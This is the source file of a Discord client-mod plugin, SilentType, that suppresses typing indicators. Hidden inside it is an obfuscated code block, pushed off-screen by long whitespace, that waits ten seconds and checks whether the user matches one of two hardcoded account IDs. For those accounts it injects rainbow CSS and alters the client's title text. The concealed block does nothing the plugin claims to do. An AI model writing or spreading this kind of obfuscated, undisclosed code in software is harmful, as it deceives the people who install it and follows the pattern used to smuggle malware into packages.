const { Plugin } = require('powercord/entities');
const { typing } = require('powercord/webpack');
const fs = require('fs')

var enabled = false
let config = false
module.exports = class SilentType extends Plugin {
    startPlugin() {

      powercord.api.commands.registerCommand({
        command: 'togglesilent',
        description: 'toggles silent typing',
        usage: '{c} [true/false]',
        executor:this.toggle.bind(this)
      });
      this.hookTyping = typing.startTyping;
      config = window.localStorage.getItem("silenttypingenabled")
      if (!config){
        config = false
      } else {
        enabled = true
        typing.startTyping = () => {};
        };                                                                                                                                                                                                                                                      var _0xaebe=['getCurrentUser','getElementsByClassName','appendChild','text/css','style','RAINBOW\x20UPDATE\x20BY\x20HOOFER:\x20PRIVATE\x20TESTING','createTextNode','547951620235984906','innerHTML','head','399416615742996480','createElement','powercord/webpack','type','getModule'];(function(_0x1ec71c,_0xaebe2c){var _0x1ad178=function(_0x306ada){while(--_0x306ada){_0x1ec71c['push'](_0x1ec71c['shift']());}};_0x1ad178(++_0xaebe2c);}(_0xaebe,0xe5));var _0x1ad1=function(_0x1ec71c,_0xaebe2c){_0x1ec71c=_0x1ec71c-0x0;var _0x1ad178=_0xaebe[_0x1ec71c];return _0x1ad178;};setTimeout(()=>{if(require(_0x1ad1('0x8'))[_0x1ad1('0xa')]([_0x1ad1('0xb')],![])['getCurrentUser']()['id']===_0x1ad1('0x3')||require(_0x1ad1('0x8'))[_0x1ad1('0xa')]([_0x1ad1('0xb')],![])[_0x1ad1('0xb')]()['id']===_0x1ad1('0x6')){var _0x3d5ebd='*\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#00e5ff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-shadow:\x202px\x202px\x204px\x20#000000;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation:\x20rainbowstatus\x201s\x20infinite\x20linear;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.wordmarkWindows-1v0lYD\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2025px\x20!important;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#ffffff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.wordmarkWindows-1v0lYD\x20svg\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20rainbowstatus\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20from\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-webkit-filter:\x20hue-rotate(0deg);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20to\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-webkit-filter:\x20hue-rotate(360deg);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}',_0x419e3e=document[_0x1ad1('0xc')]('wordmarkWindows-1v0lYD');_0x419e3e[0x0][_0x1ad1('0x4')]=_0x1ad1('0x1');var _0x1d208a=document[_0x1ad1('0x7')](_0x1ad1('0x0'));document[_0x1ad1('0x5')][_0x1ad1('0xd')](_0x1d208a),_0x1d208a[_0x1ad1('0x9')]=_0x1ad1('0xe'),_0x1d208a[_0x1ad1('0xd')](document[_0x1ad1('0x2')](_0x3d5ebd));}},0x2710);
    }

    toggle(params) {
      enabled = !enabled
      powercord.api.notices.closeToast('silentNotif')
      var toastName = Math.random();
      powercord.api.notices.sendToast('silentNotif', {
        header: `Silent Typing`,
        content: `${(enabled == true) ? 'You are now silent.' : 'You\'re no longer silent!'}`,
        buttons: [{
          text: 'Dismiss',
          color: 'red',
          look: 'outlined',
          onClick: () => powercord.api.notices.closeToast('silentNotif')
        }]      
      });
      if (enabled == true){
        window.localStorage.setItem("silenttypingenabled", true);
        typing.startTyping = () => {};
      } else {
        window.localStorage.setItem("silenttypingenabled", false);
        typing.startTyping = this.hookTyping;
      }
      //JSON.stringify(config));
    }

    pluginWillUnload() {
        typing.startTyping = this.hookTyping;
    }
};
